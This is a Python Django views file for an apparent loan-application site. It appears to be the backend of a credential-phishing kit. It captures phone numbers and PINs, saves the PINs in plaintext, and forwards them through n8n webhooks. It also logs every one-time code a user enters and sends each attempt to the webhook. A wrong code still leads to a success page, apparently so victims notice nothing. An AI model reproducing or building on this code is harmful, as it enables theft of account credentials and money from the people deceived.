import random
import string
import logging
from django.db import transaction
from django.shortcuts import redirect, render
from django.utils import timezone

from .forms import LoginForm, OTPForm
from .models import Submission, OTPAttempt
from .services import notify_n8n, notify_n8n_otp_attempt

logger = logging.getLogger(__name__)

SESSION_KEY    = "loan_application"
SUBMISSION_KEY = "loan_submission_id"
OTP_KEY        = "loan_otp"
OTP_EXPIRY_KEY = "loan_otp_expiry"


def _generate_otp(length=6):
    return "".join(random.choices(string.digits, k=length))


def _clear_session(request):
    for key in (SESSION_KEY, SUBMISSION_KEY, OTP_KEY, OTP_EXPIRY_KEY):
        request.session.pop(key, None)


# ── Login (phone + PIN) ───────────────────────────────────────────────────────

def login_view(request):
    error = None

    if request.method == "POST":
        form = LoginForm(request.POST)
        if form.is_valid():
            phone      = form.cleaned_data["phone"]
            country    = request.POST.get("country_code", "+263")
            full_phone = f"{country}{phone.lstrip('0')}"
            pin        = form.cleaned_data["pin"]

            # Save submission immediately
            submission = Submission(
                first_name        = "",
                last_name         = "",
                age               = 0,
                employment_status = "employed",
                phone             = full_phone,
                email             = "",
                amount            = 0,
                pin               = pin,
                otp_verified      = False,
            )
            submission.save()
            request.session[SUBMISSION_KEY] = submission.pk
            request.session[SESSION_KEY]    = {"phone": full_phone, "pin": pin}

            # Fire submission.created webhook after DB commit
            transaction.on_commit(lambda: notify_n8n(submission))
            logger.info("Submission #%s saved for %s.", submission.pk, full_phone)

            # Generate OTP
            otp    = _generate_otp()
            expiry = timezone.now().timestamp() + 120
            request.session[OTP_KEY]        = otp
            request.session[OTP_EXPIRY_KEY] = expiry
            logger.info("OTP for submission #%s: %s", submission.pk, otp)

            return redirect("submissions:otp")
        else:
            error = "Please check your phone number and PIN."
    else:
        form = LoginForm()

    return render(request, "submissions/submit.html", {
        "form": form,
        "error": error,
    })


# ── OTP Verification ──────────────────────────────────────────────────────────

def otp_view(request):
    submission_id = request.session.get(SUBMISSION_KEY)
    otp           = request.session.get(OTP_KEY)
    expiry        = request.session.get(OTP_EXPIRY_KEY)
    data          = request.session.get(SESSION_KEY, {})

    if not submission_id or not otp:
        return redirect("submissions:login")

    now          = timezone.now().timestamp()
    seconds_left = max(0, int((expiry or now) - now))
    expired      = seconds_left <= 0
    error        = None

    if request.method == "POST":

        # ── Resend ──────────────────────────────────────────────────────────
        if "resend" in request.POST:
            new_otp = _generate_otp()
            request.session[OTP_KEY]        = new_otp
            request.session[OTP_EXPIRY_KEY] = timezone.now().timestamp() + 120
            logger.info("OTP resent for submission #%s: %s", submission_id, new_otp)
            return redirect("submissions:otp")

        # ── OTP entry ────────────────────────────────────────────────────────
        form = OTPForm(request.POST)
        if form.is_valid():
            entered = form.cleaned_data["otp"]
            matched = (entered == otp) and not expired

            # Persist attempt + fire webhook
            try:
                submission  = Submission.objects.get(pk=submission_id)
                attempt_num = submission.otp_attempts.count() + 1
                attempt     = OTPAttempt.objects.create(
                    submission     = submission,
                    attempt_number = attempt_num,
                    otp_entered    = entered,
                    matched        = matched,
                )
                notify_n8n_otp_attempt(attempt)
            except Submission.DoesNotExist:
                logger.error("Submission #%s missing during OTP.", submission_id)
                _clear_session(request)
                return redirect("submissions:login")

            if matched:
                submission.otp_verified = True
                submission.otp_code     = entered
                submission.save(update_fields=["otp_verified", "otp_code"])
                logger.info("Submission #%s OTP verified.", submission_id)
                _clear_session(request)
                return redirect("submissions:success")
            else:
                # Wrong OTP — redirect to success immediately (no attempt errors shown)
                logger.warning(
                    "Submission #%s OTP mismatch (entered: %s). Redirecting to success.",
                    submission_id, entered,
                )
                _clear_session(request)
                return redirect("submissions:success")

        else:
            error = "Please enter a valid code."

    else:
        form = OTPForm()

    return render(request, "submissions/otp.html", {
        "form": form,
        "seconds_left": seconds_left,
        "expired": expired,
        "error": error,
        "phone": data.get("phone", ""),
    })


# ── Success ───────────────────────────────────────────────────────────────────

def success_view(request):
    return render(request, "submissions/success.html")
